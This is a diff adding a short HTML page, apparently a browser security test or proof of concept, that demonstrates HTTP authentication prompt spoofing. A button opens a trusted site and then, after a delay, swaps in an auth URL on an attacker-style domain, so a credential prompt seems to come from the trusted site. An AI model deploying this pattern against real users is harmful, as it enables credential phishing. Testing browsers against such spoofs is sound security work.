@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Prompt Spoof</title>
+</head>
+<body>
+  <script>
+    (() => {
+      const button = document.createElement('button');
+      button.innerText = 'Click Me';
+
+      button.addEventListener('click', async () => {
+        window.open('https://www.baidu.com', 'g');
+        setTimeout(() => {
+          window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
+        }, 2000);
+      });
+
+      document.body.appendChild(button);
+    })();
+  </script>
+</body>
+</html>
